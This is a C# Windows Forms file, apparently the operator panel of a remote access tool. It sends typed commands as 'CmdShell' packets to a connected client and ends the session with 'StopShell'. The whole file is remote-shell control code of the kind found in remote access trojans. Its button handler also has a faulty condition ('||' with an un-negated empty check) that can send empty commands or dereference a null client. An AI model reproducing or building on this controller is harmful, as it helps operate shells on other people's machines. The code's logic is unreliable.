using PacketLib;
using Server.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class ShellForm : Form
    {
        public _Client _Client { get; set; }
        public ShellForm()
        {
            InitializeComponent();
        }
     
        private void button1_Click(object sender, EventArgs e)
        {
            if(_Client != null || string.IsNullOrEmpty(textBox2.Text.Trim()))
            {
                button1.Enabled = false;    
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "CmdShell");
                msgPack.Set("Cmd", textBox2.Text.Trim());
                _Client.Send(msgPack.Pack());
                textBox2.Text = string.Empty;
                button1.Enabled = true;    
            }
        }

        private void ConnectionCheckup_Tick(object sender, EventArgs e)
        {
            if (_Client == null || !_Client.isConnected())
            {
                this.Close();
            }
        }

        private void ShellForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_Client != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "StopShell");
                msgPack.Set("Cmd", textBox2.Text.Trim());
                _Client.Send(msgPack.Pack());
            }
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if(e.KeyCode == Keys.Enter)
            {
                button1.PerformClick();
            }
        }
    }
}
